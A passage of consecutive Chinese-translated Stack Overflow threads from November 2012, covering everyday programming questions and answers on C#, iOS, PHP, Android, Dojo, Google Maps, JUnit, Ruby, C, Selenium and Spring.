我尝试使用 Parallel.ForEach 并行运行 ForEach1 或 ForEach2。在我的测试中，它显着提高了性能，但产生了不准确的结果。

*   如果我使用 foreach 语句运行此代码，我生成的列表有 625 个项目（这是正确的）
*   如果我将 Parallel.ForEach 用于 ForEach1，则会将 325 添加到列表中，这远低于我的预期。
*   最后，如果我将 Parallel.ForEach 用于 ForEach2，我会在列表中添加 605 个项目，但仍然缺少 20 个。

我不确定我做错了什么，或者我错过了什么。使用 Parallel foreach 或 for 时需要考虑哪些事项？

有人可以帮我整理一下吗？任何其他提高性能的建议将不胜感激

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:37:40.050

我不知道您的“获取”操作是什么，但这也可能是闭包的问题。你可以在网上搜索它。例如[foreach 标识符和闭包](https://stackoverflow.com/questions/512166/c-sharp-the-foreach-identifier-and-closures)以及[http://www.codethinked.com/c-closures-explained](http://www.codethinked.com/c-closures-explained)

# ios - 屏幕宽度和高度

> ID：13360182
> 
> 赞同：1
> 
> 时间：2012-11-13T11:44:47.913
> 
> 标签：ios, height, width, resolution, measure

我想用这段代码获取屏幕的宽度和高度......

```
float screenWidth = [UIScreen mainScreen].bounds.size.width;
float screenHeight = [UIScreen mainScreen].bounds.size.height;
NSLog(@"%f %f",screenWidth, screenHeight); 
```

我总是得到 320 480 ，但这些不是模拟器的真正衡量标准。现在我在分辨率更高的视网膜模拟器上进行测试，但我总是得到 320 480

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T11:47:49.473

我想你的答案可以在这里找到：[在 iPhone App 如何检测设备的屏幕分辨率](https://stackoverflow.com/questions/4779221/in-iphone-app-how-to-detect-the-screen-resolution-of-the-device)

它的规模也让您感兴趣。用于`CGFloat screenScale = [[UIScreen mainScreen] scale];`找出比例。

定位元素时，您的点应始终处于非视网膜比例。3.5 英寸的屏幕尺寸为 320x480 单位，4 英寸屏幕的尺寸为 320x568。像素分辨率是视网膜屏幕的两倍。

# c# - 优化 SQL 选择

> ID：13360184
> 
> 赞同：1
> 
> 时间：2012-11-13T11:45:01.550
> 
> 标签：c#, sql, visual-studio-2010, performance, oracle11g

大家好，我使用 Visual Studio 和 C# 和 oracle 11g 数据库。

我有一个带有按钮的应用程序，该按钮显示按某个日期列排序的数据网格中的所有数据。问题是这花费了 20 到 30 秒的时间太长。我想在 SQL 中使用 TOP 限制搜索，但这不是一个理想的解决方案，所以我想知道你们是否可以提供帮助。

我的问题是这种方法：

```
public List<Adress> ListOprema()
    {
        string connectionString = "provider=ORAOLEDB.ORACLE; data source=ORCL; password=****; user id=****;";
        oleCon = new OleDbConnection(connectionString);
        List<Adress> _adressStore = new List<Adress>();

        try
        {
            oleComd = new OleDbCommand();
            oleComd.Connection = oleCon;
            oleComd.CommandText = "Select Oprema.Opr_Id, Oprema.Naziv, Oprema.Datum_Nabavke, Oprema.Datum_Zaduzenja, Oprema.Dobavljac, Oprema.Jedinica_Mjere,"+
            " Oprema.Zaduzio, Oprema.Vrijednost, Oprema.Kolicina_Nabavna, Oprema.Kolicina_Otpisana, Oprema.Kolicina_Trenutna, Oprema.Status, Oprema.Konto, "+
            " Oprema.KontoIsp, Oprema.Broj_Naloga, Oprema.Sifra_Objekta, Oprema.Sifra_Prostora, Dobavljaci.Naziv AS DobNaz, Radnik.Rad_Prez, Objekti.Objekat_ID"+
            " from OPREMA Oprema, DOBAVLJACI Dobavljaci, RADNIK Radnik, OBJEKTI Objekti"+
            " WHERE Oprema.Dobavljac=Dobavljaci.Dob_Id(+) AND Oprema.Zaduzio=Radnik.Rad_Id(+) AND Oprema.Sifra_Objekta=Objekti.Objekat_ID(+)"+
            " ORDER BY Oprema.Datum_Nabavke DESC";
            oleCon.Open();
            OleDbDataReader Reader = oleComd.ExecuteReader();

           while (Reader.Read())
            {

                int ix = Reader.GetOrdinal("DATUM_NABAVKE");
                int iy = Reader.GetOrdinal("DATUM_ZADUZENJA");
                int sifra =Reader.GetOrdinal("SIFRA_OBJEKTA");
                int sifraP = Reader.GetOrdinal("SIFRA_PROSTORA");
                int zaduzio = Reader.GetOrdinal("ZADUZIO");
                int prezime = Reader.GetOrdinal("RAD_PREZ");
                _adressStore.Add(new Adress()
                //_adressStore.Add(Adress.GetFromDataReader(Reader));
                {

                    Naziv = Reader["NAZIV"].ToString(),

                    //DatumNabavke = Convert.ToDateTime(Reader["DATUM_NABAVKE"]),

                    DatumNabavke = Reader.IsDBNull(ix) ? DateTime.Now : Reader.GetDateTime(ix),

                    DatumZaduzenja = Reader.IsDBNull(iy) ? DateTime.Now : Reader.GetDateTime(iy),

                    //DatumZaduzenja = Convert.ToDateTime(Reader["DATUM_ZADUZENJA"]),

                    InventurniBroj = Convert.ToInt32(Reader["OPR_ID"]),

                    Dobavljac = Convert.ToInt32(Reader["Dobavljac"]),

                    JedinicaMjere = Reader["Jedinica_Mjere"].ToString(),

                    Zaduzio = Reader.IsDBNull(zaduzio) ? null : (int?)Reader.GetDecimal(zaduzio),

                    Vrijednost = Convert.ToDecimal(Reader["VRIJEDNOST"]),

                    KolicinaNabavna = Convert.ToInt32(Reader["KOLICINA_NABAVNA"]),

                    KolicinaOtpisana = Convert.ToInt32(Reader["KOLICINA_OTPISANA"]),

                    KolicinaTrenutna = Convert.ToInt32(Reader["KOLICINA_TRENUTNA"]),

                    Status = Reader["Status"].ToString(),

                    Konto = Convert.ToInt32(Reader["Konto"]),

                    KontoIsp = Convert.ToInt32(Reader["KontoIsp"]),

                    BrojNaloga = Reader ["Broj_Naloga"].ToString(),

                    SifraObjekta = Reader.IsDBNull(sifra) ? null : (int?)Reader.GetDecimal(sifra),

                    SifraProstora = Reader.IsDBNull(sifraP) ? null : (int?)Reader.GetDecimal(sifraP),

                    ImeZaduzioca = (string)((Reader["RAD_PREZ"] == DBNull.Value) ? null : Reader["RAD_PREZ"]),

                    ImeDobavljaca = Reader["DobNaz"].ToString(),

                    IsNew = false,

                    IsReadOnly = true
                });

            }

            oleCon.Close();
            //} 
            //oleCon.Close();
        }
        catch (Exception ex)
        {
            oleCon.Close();
            MessageBox.Show(ex.Message);
        }

        return _adressStore;
    } 
```

我运行分析器并报告这两条线是最昂贵的

Hot Path Name Inclusive % Exclusive % Inventar.UserControls.SearchBar.SearchText_Changed(object,class System.Windows.Controls.TextChangedEventArgs) 9,32 0,00 SAPBusinessObjects.WPF.Viewer.DelegateMarshaler.<>c_ *DisplayClass2.b* _0(object) 3,37 0,00

但那是因为 SearchText_Changed 调用了相同的函数，除了条件之外，当没有条件时它调用上述函数（所以当搜索字段为空时）。

我还在 oracle 的 jdeveloper 中进行了自动跟踪（其中查询运行得非常快，但这可能不是重点），结果如下：

```
SELECT STATEMENT 
         22        

 SORT ORDER BY 
         22      972 

 NESTED LOOPS OUTER 
         20      972 

 HASH JOIN RIGHT OUTER 
         20      61 

 Access Predicates 

 OPREMA.ZADUZIO=RADNIK.RAD_ID 

 TABLE ACCESS FULL 
 RADNIK      5       16 

 HASH JOIN RIGHT OUTER 
         15      45 

 Access Predicates 

 OPREMA.DOBAVLJAC=DOBAVLJACI.DOB_ID 

 TABLE ACCESS FULL 
 DOBAVLJACI      3       7 

 TABLE ACCESS FULL 
 OPREMA      11      38 

 INDEX UNIQUE SCAN 
 OBJEKTI_PK      0       911 

 Access Predicates 

 OPREMA.SIFRA_OBJEKTA=OBJEKTI.OBJEKAT_ID 
```

一位朋友建议我在应用程序加载时填充所有可观察的集合，然后搜索这些集合，但我不知道从哪里开始，仍然是初学者。

无论如何，我希望你们能提供帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:31:24.383

事实证明，问题不在于 SQL，而在于选项卡式视图和 DataGrid。他们似乎并没有很好地配合。切换到 ListView 使其速度提高了 60%。如果我打开一个新窗口，它会在不到一秒的时间内完成。感谢大家的帮助。

# php - 简单的 PHP 函数调用不再起作用

> ID：13360188
> 
> 赞同：-6
> 
> 时间：2012-11-13T11:45:19.500
> 
> 标签：php

```
class blah{

    function a( x ){
    $variablename = b();
    ....
    }

    function b(){
    echo("why is this code (first line of function b) seemingly unreachable");
    ....
    }
} 
```

在本地服务器上执行时它工作正常，但不是！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T11:49:47.777

```
$variable = $this->b(); 
```

如果您从非静态上下文中调用它。否则

```
$variable = self::b(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:49:45.640

您在所有变量上都缺少美元符号 ($)。

我真的很惊讶它在本地工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T11:54:00.873

试试这个：

```
class blah{
    function a( $x ){
        $this->b(); // <---- added this ...
    }

    public function b(){
        echo("why is this code (first line of function b) seemingly unreachable");
    }

}

$test = new blah;
$test->a("some_string"); 
```

# android - 包含地点和图片的 Facebook SDK 帖子

> ID：13360190
> 
> 赞同：1
> 
> 时间：2012-11-13T11:45:24.310
> 
> 标签：android, facebook, facebook-graph-api, facebook-android-sdk, checkin

我正在使用 Facebook 最新的 Android SDK。

是否可以发布同时包含地点和图片的状态？

我的捆绑包如下所示：

```
Bundle postParams = new Bundle();
postParams.putString("message", "Hi there!!");
postParams.putString("picture", "http://www.peleozen.net/pics/2_bus_face_logo.jpg");
postParams.putString("place", "204519339582365"); 
```

当我提出请求时，它会导致只有图片的状态。

在没有图片的情况下提出请求会导致签入

那么……可以两者兼得吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T20:31:32.460

您可以发布到 /me/photos 端点，因此从某种意义上说，您是在发布照片，向其添加位置，而标题就是消息。例如，如果使用最新的 SDK，您可以查看 HelloFacebookSample 并对 postPhoto 方法进行以下更改以尝试此操作：

```
....
        Bundle params = request.getParameters();
        params.putString("message", "Hi there!!");
        params.putString("place", "166793820034304");
        request.setParameters(params);
        Request.executeBatchAsync(request);
.... 
```

如需参考，请参阅：[https ://developers.facebook.com/docs/reference/api/user/#photos](https://developers.facebook.com/docs/reference/api/user/#photos)

# javascript - 页面中有多个 js 文件，每个文件都以 require() 开头：不好的做法还是好的？

> ID：13360193
> 
> 赞同：1
> 
> 时间：2012-11-13T11:45:34.263
> 
> 标签：javascript, module, dojo

我正在编写一个框架，允许您的模块在提供页面之前定义哪些 JS 文件将被添加到页面中。这个想法是一个模块可能会添加这样的东西：

```
require([ 'dojo/topic', 'dojo/_base/window', 'hotplate/hotDojoWidgets/AlertBar' ], function( topic, win, AlertBar
){
  globalAlertBar = new AlertBar( { background: '#FF4444' } );
  globalAlertBar.placeAt( document.body, 'first' );
  globalAlertBar.startup();

  topic.subscribe('globalAlert', function( message, displayFor ){
    displayFor = displayFor || 2500;
    globalAlertBar.set( 'message', message );
    globalAlertBar.show( displayFor );
  });
}); 
```

例如，这允许我允许应用程序周围的其他小部件发布`globalAlert`以显示 alertBar。马上：

*   添加到要加载的 JS 列表中的任何 JS/Dojo 文件都以“require”开头。对我来说，这只是加载后会在某个时间点运行的异步代码。在框架中以这种方式加载的大部分代码都会等待主题发布，并会采取相应的行动
*   “应用程序”将只是这些模块之一，它将订阅发布容器对象的主题
*   由 require() 加载的“正确的”Dojo 小部件显然会使用“定义”——这和往常一样，不用担心

问题：

1) 如果我`ready()`在页面中引用的其中一个 JS/Dojo 文件中运行，那会是页面级的 ready()，包括文档中加载的所有 .js 文件吗？还是仅针对当前文件加载的文件？

2）我意识到“正确”的做事方式是只运行一个 JS 文件`require()`，并从该文件加载其他所有文件（或者使用 data-dojo-main 更好）。但是，我正在尝试定义独立工作的模块（带有服务器和客户端代码）并将它们自己添加到页面中......那么，在应用程序页面中有一堆文件，然后拥有它们实际上是不好的做法`require()`正在运行 Dojo 代码？

谢谢！

默克。

PS如果你好奇，[https://github.com/mercmobily/hotplate](https://github.com/mercmobily/hotplate) ...项目在这里发帖后开始！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T01:20:53.920

您可以根据*需要*对每个页面/文件/脚本有尽可能多的要求。它*定义*了每页只能使用一次，因为这就是页面/脚本位置和模块 ID 之间的关联。*define*并不严格用于小部件——它定义了一个模块，它可以是一个函数、构造函数（类）、一个单例对象，或者只是做一些工作而不返回任何东西。

*require*是异步的；因此，当所有依赖项完成加载时触发的回调方法：

```
require(modules, callback); 
```

*dojo/ready*本质上是基于“块”的。**在加载所有依赖项并且**DOM 准备好之前，回调不会触发。它不是基于页面的，也不是全局的——如果第一个请求等待 DOM，则很有可能在第一个请求之前触发的页面上有第二个请求。

# javascript - 谷歌地图脚本不适用于空变量

> ID：13360195
> 
> 赞同：0
> 
> 时间：2012-11-13T11:45:50.590
> 
> 标签：javascript, jquery, google-maps, google-maps-api-3

这是我的代码：

```
function geocode(){
      var country_code ='us';
//    var country_code ='';    
//    if (country_code) var country_code = read_cookie('country');
//    country_code = country_code.toLowerCase();

    var GeoCoded = { done: false };
    var input = document.getElementById('loc');
    var options = { types: [], componentRestrictions: { 'country': country_code } }; 
```

它旨在提取存储在用户计算机上的 cookie 值并将其设置为自动建议的 component_restrictions 值。但是，我遇到的问题是，如果用户没有设置 cookie，则该值为空。componentRestriction 似乎只有在有值时才有效。

例如，如果我使用这条线，它可以工作：

```
var country_code ='us'; 
```

如果我使用这条线，它不会：

```
var country_code =''; 
```

我希望它能够正常工作，这样如果没有设置 cookie，那么就没有 componentRestriction，因此它会自动建议所有国家/地区。这似乎仅在我完全删除此代码时才有效：

```
componentRestrictions: { 'country': country_code } } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:54:16.767

基于 cookie 与无 cookie 调整选项对象

```
var options = { types: []};

var country_code= read_cookie('country')

if( country_code){
    options.componentRestrictions= { 'country': country_code } ;
} 
```

# java - JUnit @Test InvalidStateException

> ID：13360200
> 
> 赞同：2
> 
> 时间：2012-11-13T11:46:11.297
> 
> 标签：java, testing, junit

我的测试应用程序有问题，如下所示。我有以下代码：

```
@Test(expected = InvalidStateException.class)
public void testLiianPitkaKayttajatunnus() 
```

{...}

我正在使用 Eclipse，它说`"InvalidStateException cannot be resolved to a type"`并且我们知道如果 eclipse 注意到一个问题，它会用红色波浪线强调它。我一直在尝试搜索解决方案，但仍然没有找到任何解决方案。我尝试了以下事情，但没有一个解决了这个问题：

1.  向我添加`org.apache.openjpa`依赖`pom.xml`项并在类代码之前添加行`"import org.apache.openjpa.persistence.InvalidStateException;"`
2.  在[thread](https://stackoverflow.com/questions/1151237/junit-expected-tag-not-working-as-expected)中，据说如果您的类中有其他类的扩展，则应将其取出。这也没有帮助。
3.  在同一个线程中，一个建议是使用 JUnit 4.4，但它也没有帮助。

所以我的问题是如何解决这个问题？

有关其他信息，我的课程开始如下（此处未提及导入）公共类`TietorakenneTest`扩展`TietokantaTestCase {....}`和我使用的 JUnit 版本是 4.10，感谢任何帮助。如果您需要有关代码的任何其他信息，请告诉我，我会将它们放在这里。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:01:16.943

将您的导入语句更改为

`org.apache.openjpa.util.InvalidStateException`正如您提到的，将`org.apache.openjpa`依赖项添加到我的 pom.xml

希望能帮助到你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:01:33.023

通过添加包名称来限定类。

```
@Test(expected = org.apache.openjpa.persistence.InvalidStateException.class) 
```

# c# - 无法击败“内存不足”异常

> ID：13360201
> 
> 赞同：1
> 
> 时间：2012-11-13T11:46:11.903
> 
> 标签：c#, memory-leaks, xamarin.android, out-of-memory

我正在为 Android 开发一个带有 Mono 的应用程序。

在过去的几天里，我一直在与内存不足异常作斗争，并且开始失去希望！

我有一个 ListView 显示从 200 到 600 项的任何内容。这些项目由位图缩略图和一些文本组成。

我正在使用 AsyncTask 异步解码位图，代码如下：

```
public class BitmapWorkerTask : AsyncTask
    {
        private WeakReference imageViewReference;
        public string thisURL = "";
        private int sampleSize = 0;
        private int reqHeight = 0;
        private int reqWidht = 0;

        public BitmapWorkerTask(ImageView imageView, int pSampleSize, int pReqWidth, int pReqHeight)
        {
            //_____________________________________________________________________
            // Use a WeakReference to ensure the ImageView can be garbage collected
            imageViewReference = new WeakReference(imageView);

            reqHeight = pReqHeight;
            reqWidht = pReqWidth;
            sampleSize = pSampleSize;
        }

        protected override Java.Lang.Object DoInBackground(params Java.Lang.Object[] @params)
        {
            string strUrl = @params[0].ToString();

            try
            {
                return DecodeSampleBitmapFromStream(strUrl, reqWidht, reqHeight);
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        protected override void OnPostExecute(Java.Lang.Object result)
        {
            base.OnPostExecute(result);

            if (IsCancelled)
            {
                result = null;
                Log.Debug("TT", "OnPostExecute - Task Cancelled");
            }
            else
            {
                Bitmap bmpResult = result as Bitmap;

                if (imageViewReference != null && bmpResult != null)
                {
                    ImageView view = imageViewReference.Target as ImageView;

                    if (view != null)
                    {
                        view.SetImageBitmap(bmpResult);
                    }
                }
            }
        }

        public static int CalculateInSampleSize( BitmapFactory.Options options, int reqWidth, int reqHeight)
        {
            //_____________________________
            // Raw height and width of image
            int height = options.OutHeight;
            int width = options.OutWidth;
            int inSampleSize = 1;

            if (height > reqHeight || width > reqWidth)
            {
                if (width > height)
                {
                    inSampleSize = (int)Math.Round((float)height / (float)reqHeight);
                }
                else
                {
                    inSampleSize = (int)Math.Round((float)width / (float)reqWidth);
                }
            }

            return inSampleSize;

        }

        public static Bitmap DecodeSampleBitmapFromStream(string URL, int reqWidth, int reqHeight)
        {
            URL url = new URL(URL);

            try
            {
                //______________________________________________________________
                // First decode with inJustDecodeBounds=true to check dimensions
                BitmapFactory.Options options = new BitmapFactory.Options();
                options.InJustDecodeBounds = true;
                BitmapFactory.DecodeStream(url.OpenConnection().InputStream, null, options);

                //______________________
                // Calculate inSampleSize
                options.InSampleSize = CalculateInSampleSize(options, reqWidth, reqHeight);

                //____________________________________
                // Decode bitmap with inSampleSize set
                options.InJustDecodeBounds = false;
                return BitmapFactory.DecodeStream(url.OpenConnection().InputStream, null, options);
            }
            catch (Exception ex)
            {
                return null;
            }
            finally
            {
                url.Dispose();
            }
        } 
```

我使用此方法从 Lists GetView() 函数启动此 AsyncTask：

```
public void loadBitmap(string url, ImageView imageView)
        {
            if (Common.cancelPotentialWork(url, imageView))
            {
                BitmapWorkerTask task = new BitmapWorkerTask(imageView, 2, 80,80);

                AsyncDrawable asyncDrawable = new AsyncDrawable(null, null, task);

                imageView.SetImageDrawable(asyncDrawable);

                task.Execute(url);
            }
        } 
```

在一段时间内一切都按预期工作，但如果我在列表中不断上下滚动，我最终会开始收到`OutOfMemoryException`s 并且应用程序崩溃。我对 Android 列表如何工作的理解是它会在`ListItem`视图移出屏幕时处理它们，但感觉好像这没有发生！

感觉就像我在滚动列表时正在解码的所有位图出于某种原因被保存在内存中？我可能会错过什么阻止这些位图被处理掉？我在哪里可以调用以`Bitmap.Recycle()`确保位图被清除？

我做了一个测试，在每次调用 GetView 时都调用了 GC.Collect，这似乎使我的内存使用保持相当一致，但我知道这不应该是必需的，它会影响滚动性能。

为什么当我在没有调用的情况下滚动列表时，`GC.Collect()`我没有看到那些表明系统实际上正在执行例行收集的垃圾收集消息？

感谢任何帮助，我失去了编码的意愿！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:12:23.267

> 我对 Android 列表如何工作的理解是，当列表项视图移出屏幕时，它会处理它们，但感觉好像这没有发生！

这是不正确的。

Android 所做的是保留一组项目视图，并在它们离开屏幕后尝试重用它们。这就是 convertView 参数的用途。

我看不到您在问题中发布的适配器代码，因此我不确定您的代码用于使用 convertView 参数是什么，但我猜想在 convertView 的情况下它应该做什么：

*   它应该取消任何现有的异步图像获取/转换
*   它应该开始一个新的

* * *

MvvmCross 代码作为参考/示例对您来说可能有点过于复杂，但您至少可以看到在[MvxBindableListAdapter.cs](https://github.com/slodge/MvvmCross/blob/vnext/Cirrious/Cirrious.MvvmCross.Binding.Droid/Views/MvxBindableListAdapter.cs)中使用的 convertView - 请参阅`protected virtual View GetBindableView(View convertView, object source, int templateId)`

# ruby - 在Ruby中隐藏Windows桌面图标“我的电脑”

> ID：13360204
> 
> 赞同：0
> 
> 时间：2012-11-13T11:46:28.807
> 
> 标签：ruby, windows, winapi

我使用此脚本删除 Windows 桌面图标“我的电脑”，但该图标仍然可见。我手动隐藏它没有问题。

```
require 'win32/registry'
keyname= 'Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu'
access = Win32::Registry::KEY_ALL_ACCESS
Win32::Registry::HKEY_CURRENT_USER.open(keyname, access) do |reg|
  reg.each{|k, v| 
    puts k, v
    reg[k, Win32::Registry::REG_DWORD] = 1
    puts k, v
  }
end 
```

我尝试用这个刷新桌面

```
SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDWININICHANGE = 0x02

systemParametersInfo.call(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE) 
```

并且会立即删除壁纸，但不会删除图标

# .net - String.Comparison/CompareString 的默认行为与连字符不一致

> ID：13360207
> 
> 赞同：0
> 
> 时间：2012-11-13T11:46:37.340
> 
> 标签：.net, winapi, string-comparison

CompareString (Win32) 和 String.Compare (.NET) 的默认行为似乎在很大程度上使其无用。但也许我错过了一些东西。考虑以下 .NET 示例：

```
namespace ConsoleApplication
{
  class Program
  {
    static string CompareStrings(string str1, string str2)
    {
      int result = String.Compare(str1, str2);
      if (result < 0)
        return "<";
      else if (result > 0)
        return ">";
      else
        return "=";
    }

    static void Main(string[] args)
    {
      string s1 = "---dta-----";
      string s2 = "DTA";
      string s3 = "---DTA---";

      Console.WriteLine("S1 {0} S2", CompareStrings(s1, s2));
      Console.WriteLine("S2 {0} S3", CompareStrings(s2, s3));
      Console.WriteLine("S3 {0} S1", CompareStrings(s3, s1));
      Console.ReadKey();
    }
  }
} 
```

哪个输出：

```
S1 < S2
S2 < S3
S3 < S1 
```

这对于任何合理的排序算法显然是无用的，因为 S1 不能同时小于和大于 S3。

（注意。使用默认参数的 Win32 CompareString 函数可以演示完全相同的行为）

根据CompareString的[文档：](http://msdn.microsoft.com/en-gb/library/windows/desktop/dd318144%28v=vs.85%29.aspx)

> “CompareString [...] 默认[s] 使用“单词排序”技术。对于这种类型的排序，所有标点符号和其他非字母数字字符（连字符和撇号除外）都位于任何字母数字字符之前。连字符和撇号与其他非字母数字字符的处理方式不同，以确保诸如“coop”和“co-op”之类的单词在排序列表中保持在一起。

这可能在某种程度上解释了为什么这个例子表现出这种奇怪的行为，以及为什么指定 SORT_STRINGSORT 标志（使用 CompareString）会产生“合理”的结果（在 .NET 中指定 StringComparison.InvariantCulture 也可以解决问题，尽管显然这并不完全相等的）。

我的问题是——谁能告诉我在什么情况下默认行为是可取的，或者它只是一个错误？

# c - 函数的二维字符数组的输出参数

> ID：13360211
> 
> 赞同：2
> 
> 时间：2012-11-13T11:46:56.580
> 
> 标签：c, compiler-errors, segmentation-fault

我希望您能为我正在为作业编写的程序的这种方法提供一些输入和二维数组。编程语言是 CI 得到了一些输入参数：

> > FILE * ifp = 输入文件指针，在main中打开，打开一个txt文件，格式为每行3个字符串
> > 
> > char ** firstTokens, middleTokens = 2 维 char 数组，我希望它们保留前两个字符串减去每个字符串末尾的预期标点符号（例如逗号和句点）。计划作为输出参数。
> > 
> > char * lastLetter = txt 文件中每行最后一列中任何字符串的第一个字母。计划作为输出参数。
> > 
> > int numberOfLines = 我希望从文本文件中读取的行数

这是我的主函数中对方法的调用：

```
readLine(ifp, firstTokens, middleTokens, lastLetter, numberOfLines); 
```

我认为我的问题在于正确获取`firstTokens`和`middleTokens`，因为我总是在编辑中遇到编译器错误和分段错误。对错误的一些帮助/澄清将不胜感激。

```
void readLine(FILE * ifp, char ** firstTokens, char ** middleTokens, char* lastLetter, int numberOfLines)
{
    char* tempFirst;
    char* tempMiddle;
    char* tempLast;
    char delim[4];
    delim[0] = '.';
    delim[1] = '\0';
    delim[2] = '\n';
    delim[3] = ',';
    int i;

    for(i = 0; i < numberOfLines; i++)
    {
        fscanf(ifp, "%s %s %s", tempFirst, tempMiddle, tempLast);
        *firstTokens[i] = strtok(tempFirst, delim);
        *middleTokens[i] = strtok(tempMiddle, delim);
        lastLetter[i] = tempLast[0];
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:49:57.050

您需要为 、 和 分配`tempFirst`存储`tempMiddle`空间`tempLast`。 `fscanf`写入这些指针，假设您已经为它们提供了足够的内存。

```
#define MAX_NAME_LEN (20) /* change this as required */
...
char tempFirst[MAX_NAME_LEN];
char tempMiddle[MAX_NAME_LEN];
char tempLast[MAX_NAME_LEN];
...
fscanf(ifp, "%s %s %s", tempFirst, tempMiddle, tempLast); 
```

# selenium - 驱动程序不是无法通过 xpath 找到元素 defaultCurrency。！

> ID：13360212
> 
> 赞同：0
> 
> 时间：2012-11-13T11:46:59.657
> 
> 标签：selenium, webdriver, selenium-webdriver

驱动程序不是无法通过 xpath 找到元素 defaultCurrency。

错误 -“org.openqa.selenium.ElementNotVisibleException：元素当前不可见，因此可能无法与之交互。”

**代码：**

```
driver.findElement(By.xpath("//[@id='currency']/fieldset[2]/table/tbody/tr[1]/td[2]")).click();

WebElement defaultCurrency = driver.findElement(By.xpath(".//*[@id='defaultCurrency']"));

Select defaultCurrency_Select = new Select(defaultCurrency); defaultCurrency_Select.selectByVisibleText("USD"); 
```

**源代码：**

```
<td>
    <select id="defaultCurrency" class="validate[required]" onchange="javascript:clrErrors()" style="height:25px;width:160px;" name="defCurrency.defaultCurrency">    
        <option value="">Select Currency..</option>
        <option value="INR">GBP</option>
        <option value="EUR">EUR</option>
        <option value="USD">USD</option>
    </select>
</td> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T16:01:02.437

WebDriver`ElementNotVisibleException`仅在元素不可见时抛出异常。因此，查看元素（例如通过 Firebug）并注意哪个元素正在激活他以使其可见。然后尝试激活第一个元素，然后对所需的元素进行操作。或者可能元素被设计为在特定时刻是不可见的，因此您不应该被允许对其执行操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-09T10:12:27.173

用这个

```
Select currency = new Select(driver.findElement(By.cssSelector("Select[id="defaultCurrency"]"))); 
```

# spring - Spring 身份验证在用户创建的线程中不可用

> ID：13360214
> 
> 赞同：1
> 
> 时间：2012-11-13T11:47:13.137
> 
> 标签：spring, spring-security, spring-3

我通过实现 UserDetailsS​​ervice 来使用基于弹簧的身份验证。以下是我的春季配置

```
<authentication-manager>
    <authentication-provider user-service-ref="authenticationService">
        <password-encoder ref="passwordEncoder">
            <salt-source ref="authenticationService"/>
        </password-encoder>
    </authentication-provider>
</authentication-manager> 
```

我的身份验证服务如下所示：

```
public class AuthenticationServiceImpl implements AuthenticationService, UserDetailsService, SaltSource {
    ....
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException, DataAccessException { 
        ....
        return new org.springframework.security.core.userdetails.User(username, user.getPassword(), true, true, true, true, authorities);
    }
 } 
```

现在的问题是当我从我的一个弹簧控制器创建一个新线程时。如何在该线程中验证我的用户？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:07:50.370

```
 SecurityContextHolder.getContext().setAuthentication(new UsernamePasswordAuthenticationToken(loadUserByUsername), password)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:29:32.380

我找到了一个更好的解决方案，将其设置在配置本身中。使用以下代码：

```
<bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetClass"
              value="org.springframework.security.core.context.SecurityContextHolder"/>
    <property name="targetMethod" value="setStrategyName"/>
    <property name="arguments"><b:list><b:value>MODE_INHERITABLETHREADLOCAL</value></list></property>
</bean> 
```

奇迹般有效。

# c# - 如何发送谓词表达式？

> ID：13360217
> 
> 赞同：-1
> 
> 时间：2012-11-13T11:47:23.190
> 
> 标签：c#, linq

我有构造函数

```
class MyClass
{
    public MyClass(IReportGroup reportGroup, Func<..., bool> filter)
    {
         reportGroup.Reports.Where(filter).ToList().ForEach(r => ... )
    }
} 
```

调用：`new MyClass(reportGroup, () => reports.Where(r=>r.ID != 0))`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:56:26.557

这个问题有点不清楚，但我想你想要实现的是传递要在 Where 方法中使用的过滤器表达式？您可以通过传递`Func<T, bool>`where`T`是列表中找到的对象类型来做到这一点。我整理了一个小示例程序，展示了这一点：

```
public class Person
{
    public string Name { get; set; }
}

public class Program
{
    private static void Main(string[] args)
    {
        IEnumerable<Person> persons = GetPersons();

        // invoke the method, passing a filter expression to be used
        PrintFiltered(persons, p => p.Name.StartsWith("F"));
    }

    private static void PrintFiltered(IEnumerable<Person> persons, Func<Person, bool> filter)
    {
        // use the expression to filter the sequence
        foreach (Person person in persons.Where(filter))
        {
            Console.WriteLine(person.Name);
        }
    }

    private static IEnumerable<Person> GetPersons()
    {
        return new[]
            {
                new Person { Name = "Fredrik" },
                new Person { Name = "John" },
                new Person { Name = "Steven" },
            };
    }
} 
```

要在构造函数中接受过滤器，并且还有一个默认过滤器（将返回完整序列），您可以这样做：

```
class MyClass
{
    public MyClass() : this(p => true) { }

    public MyClass(Func<Person, bool> filter)
    {
        // do work
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:50:38.743

我猜你想将过滤器表达式作为参数传递给你的构造函数。您必须只传递您在`where`函数中编写的 lambda，并在参数类型定义中指定报告集合元素的类型：

```
public MyClass(IReportGroup reportGroup, Expression<Func<Report, bool>> filter) 
```

并像这样调用它：

```
new MyClass(reportGroup, r => r.ID != 0) 
```

* * *

## 回答 #3

